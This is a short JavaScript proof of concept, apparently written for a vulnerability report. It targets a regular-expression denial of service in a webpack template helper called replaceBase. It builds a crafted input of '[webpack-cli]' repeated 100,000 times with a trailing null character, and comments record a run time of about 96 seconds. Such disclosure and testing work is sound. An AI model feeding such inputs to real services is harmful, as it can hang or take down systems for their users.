const { replaceBase } = require("./template-common.js");

//Attack String :""+"[webpack-cli]"*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "[webpack-cli]";
}
str += "\u0000";

var result = replaceBase(str);

// real    1m36.146s
// user    1m36.103s
// sys     0m0.020s
